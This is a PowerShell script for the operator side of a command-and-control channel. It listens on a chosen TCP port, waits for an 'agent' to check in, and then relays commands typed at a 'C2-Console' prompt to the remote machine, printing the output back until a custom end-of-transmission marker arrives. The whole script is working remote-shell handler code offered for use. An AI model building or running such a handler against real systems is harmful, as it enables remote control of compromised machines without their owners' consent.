while ($true) {
    Write-Host "`n=========================================" -ForegroundColor Gray
    $InputPort = Read-Host "Enter the port to listen on (or type 'quit')"
    
    if ($InputPort.Trim().ToLower() -eq "quit") { break }
    $port = 0
    if ([string]::IsNullOrWhiteSpace($InputPort) -or -not [int]::TryParse($InputPort.Trim(), [ref]$port) -or $port -lt 1 -or $port -gt 65535) { continue }

    $Listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, $port)

    try {
        $Listener.Start()
        Write-Host "[+] Server is listening on port $port..." -ForegroundColor Green
        
        $Client = $Listener.AcceptTcpClient() 
        Write-Host "[+] Agent checked in from $($Client.Client.RemoteEndPoint)" -ForegroundColor Cyan
        
        $Stream = $Client.GetStream()
        $Reader = New-Object System.IO.StreamReader($Stream)
        $Writer = New-Object System.IO.StreamWriter($Stream)
        $Writer.AutoFlush = $true
        
        if ($Stream.DataAvailable -or $true) {
            Write-Host "[*] Initial Payload: $($Reader.ReadLine())" -ForegroundColor Yellow
        }

        while ($Client.Connected) {
            $Cmd = Read-Host "C2-Console"
            if ([string]::IsNullOrWhiteSpace($Cmd)) { continue }
            
            $Writer.WriteLine($Cmd)
            if ($Cmd.Trim() -eq "exit") { break }
            
            Write-Host "--- Command Output ---" -ForegroundColor Gray
            
            # FIX: Loop continuously until we see our custom end-of-frame delimiter
            while ($Client.Connected) {
                $Line = $Reader.ReadLine()
                if ($null -eq $Line) { break }
                if ($Line -eq "!!END_OF_TRANSMISSION!!") { break } # Stop parsing immediately
                Write-Host $Line
            }
            Write-Host "----------------------" -ForegroundColor Gray
        }
    }
    catch {
        Write-Host "[!] Session interrupted." -ForegroundColor Red
    }
    finally {
        if ($Client) { $Client.Close() }
        if ($null -ne $Listener) { $Listener.Stop() }
        Write-Host "[-] Session cleanly recycled back to initialization." -ForegroundColor Red
    }
}
